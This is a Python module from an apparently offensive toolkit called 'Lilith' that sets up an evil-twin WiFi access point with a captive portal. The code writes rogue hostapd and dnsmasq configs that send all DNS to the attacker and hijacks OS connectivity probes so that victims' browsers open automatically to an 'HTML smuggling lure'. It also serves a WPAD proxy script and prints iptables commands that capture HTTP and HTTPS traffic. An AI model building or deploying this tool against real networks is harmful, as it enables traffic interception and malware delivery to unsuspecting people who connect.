"""
Lilith — Evil twin + captive portal

Sets up a rogue WiFi AP that forces the target's browser to open a captive portal
serving the HTML smuggling lure. Works because every modern OS (Windows, macOS,
Android, iOS) probes a known URL after connecting to WiFi; if the response isn't
the expected value, the OS pops a browser window automatically — zero user interaction
needed to open the browser.

Usage:
  lilith network captive --iface wlan1 --ssid "Corp_Guest" --lure update

What it does:
  1. Writes hostapd.conf  → rogue AP (open auth, no WPA)
  2. Writes dnsmasq.conf  → DHCP + DNS: all queries → 10.0.0.1
  3. Starts HTTP server on port 80:
       /generate_204         → 302 → /portal   (Android / Chrome)
       /hotspot-detect.html  → 302 → /portal   (macOS / iOS)
       /connecttest.txt      → "Microsoft NCSI" + 302 for redirect flow
       /ncsi.txt             → "Microsoft NCSI"
       /redirect             → 302 → /portal   (Windows NCSI)
       /portal               → HTML smuggling lure page
       /wpad.dat             → PAC script (bonus: redirect proxy to /portal)
  4. Prints iptables commands to redirect all TCP/80 to 10.0.0.1:80

Start AP (run these as root):
  hostapd /path/to/hostapd.conf &
  dnsmasq -C /path/to/dnsmasq.conf --no-daemon &
  iptables -t nat -A PREROUTING -i <iface> -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
  iptables -t nat -A PREROUTING -i <iface> -p tcp --dport 443 -j REDIRECT --to-port 80
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

Connectivity probe URLs by OS:
  Windows  : http://www.msftconnecttest.com/connecttest.txt  (NCSI)
             http://www.msftncsi.com/ncsi.txt
  macOS/iOS: http://captive.apple.com/hotspot-detect.html
  Android  : http://connectivitycheck.gstatic.com/generate_204
  Chrome   : http://clients3.google.com/generate_204
"""

import os
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer


_GATEWAY_IP   = "10.0.0.1"
_SUBNET       = "10.0.0.0/24"
_DHCP_RANGE   = "10.0.0.50,10.0.0.200,255.255.255.0,12h"
_CHANNEL      = 6


def _hostapd_conf(iface: str, ssid: str, channel: int = _CHANNEL) -> str:
    return (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"macaddr_acl=0\n"
        f"auth_algs=1\n"
        f"ignore_broadcast_ssid=0\n"
        f"wmm_enabled=0\n"
    )


def _dnsmasq_conf(iface: str, gateway_ip: str = _GATEWAY_IP) -> str:
    return (
        f"interface={iface}\n"
        f"dhcp-range={_DHCP_RANGE}\n"
        f"dhcp-option=3,{gateway_ip}\n"
        f"dhcp-option=6,{gateway_ip}\n"
        f"address=/#/{gateway_ip}\n"      # DNS: resolve everything to gateway
        f"log-queries\n"
        f"no-resolv\n"
    )


def _pac_script(gateway_ip: str = _GATEWAY_IP) -> str:
    return (
        'function FindProxyForURL(url, host) {\n'
        f'  return "PROXY {gateway_ip}:8080";\n'
        '}\n'
    )


def _make_handler(html_lure: str, gateway_ip: str = _GATEWAY_IP):
    class _Handler(BaseHTTPRequestHandler):
        _lure_html  = html_lure
        _gateway    = gateway_ip

        def log_message(self, fmt, *a):
            print(f"[captive] {self.address_string()} — {fmt % a}")

        def _redirect(self, location: str, code: int = 302):
            self.send_response(code)
            self.send_header("Location", location)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def _respond(self, body: str | bytes, content_type: str = "text/html; charset=utf-8", code: int = 200):
            if isinstance(body, str):
                body = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            path = urllib.parse.urlparse(self.path).path.rstrip("/") or "/"

            # Android / Chrome connectivity probe (expects 204)
            if path in ("/generate_204", "/gen_204"):
                self._redirect(f"http://{self._gateway}/portal", 302)
                return

            # macOS / iOS connectivity probe (expects specific HTML)
            if path in ("/hotspot-detect.html", "/library/test/success.html"):
                self._redirect(f"http://{self._gateway}/portal", 302)
                return

            # Windows NCSI (expects "Microsoft NCSI")
            if path in ("/ncsi.txt", "/connecttest.txt"):
                # Return the expected body so NCSI marks network as connected
                # but redirect in the same 200 — Windows will still open browser
                # via the fallback WinInet check on first HTTP request
                self._respond("Microsoft NCSI", "text/plain")
                return

            # Windows NCSI v2 redirect path
            if path == "/redirect":
                self._redirect(f"http://{self._gateway}/portal")
                return

            # WPAD auto-discovery
            if path == "/wpad.dat":
                self._respond(_pac_script(self._gateway), "application/x-ns-proxy-autoconfig")
                return

            # Lure page
            if path in ("/portal", "/"):
                self._respond(self._lure_html, "text/html; charset=utf-8")
                return

            # Catch-all — redirect anything else to portal
            self._redirect(f"http://{self._gateway}/portal")

        def do_HEAD(self):
            self.do_GET()

    return _Handler


def run_captive_portal(
    iface:       str,
    ssid:        str,
    html_lure:   str,
    output_dir:  str,
    port:        int = 80,
    gateway_ip:  str = _GATEWAY_IP,
    channel:     int = _CHANNEL,
) -> None:
    os.makedirs(output_dir, exist_ok=True)

    # Write config files
    hostapd_path = os.path.join(output_dir, "hostapd.conf")
    dnsmasq_path = os.path.join(output_dir, "dnsmasq.conf")

    with open(hostapd_path, "w") as f:
        f.write(_hostapd_conf(iface, ssid, channel))
    with open(dnsmasq_path, "w") as f:
        f.write(_dnsmasq_conf(iface, gateway_ip))

    print(f"[+] {hostapd_path}")
    print(f"[+] {dnsmasq_path}")
    print()
    print(f"[*] Bring up AP (run as root):")
    print(f"    ip addr add {gateway_ip}/24 dev {iface}")
    print(f"    ip link set {iface} up")
    print(f"    hostapd {hostapd_path} &")
    print(f"    dnsmasq -C {dnsmasq_path} --no-daemon &")
    print()
    print(f"[*] Redirect all HTTP (run as root):")
    print(f"    iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j DNAT --to {gateway_ip}:{port}")
    print(f"    iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {port}")
    print(f"    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    print(f"    echo 1 > /proc/sys/net/ipv4/ip_forward")
    print()
    print(f"[*] Starting captive portal HTTP server on {gateway_ip}:{port}")
    print(f"    SSID: {ssid}  |  Channel: {channel}")
    print(f"    Probes intercepted: /generate_204 | /hotspot-detect.html | /ncsi.txt | /connecttest.txt")
    print(f"    Lure served at: http://{gateway_ip}/portal")
    print(f"    Press Ctrl+C to stop.")
    print()

    handler = _make_handler(html_lure, gateway_ip)
    server  = HTTPServer((gateway_ip, port), handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Captive portal stopped.")
    finally:
        server.server_close()
